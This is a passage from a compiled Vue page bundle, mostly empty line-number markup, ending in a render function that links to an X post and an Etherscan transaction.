class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function m(b,y){const a=l("ExternalLinkIcon");return e(),o("div",null,[u,r,n("ul",null,[n("li",null,[n("a",k,[s("https://x.com/DeeLMind/status/1820629106062688396"),t(a)])]),n("li",null,[n("a",d,[s("https://etherscan.io/tx/0xf715465bc5d8281ac69010e056989ea99383a81b0b68f1dc789d13b063647552"),t(a)])])]),v])}const f=p(i,[["render",m],["__file","dev.html.vue"]]);export{f as default};
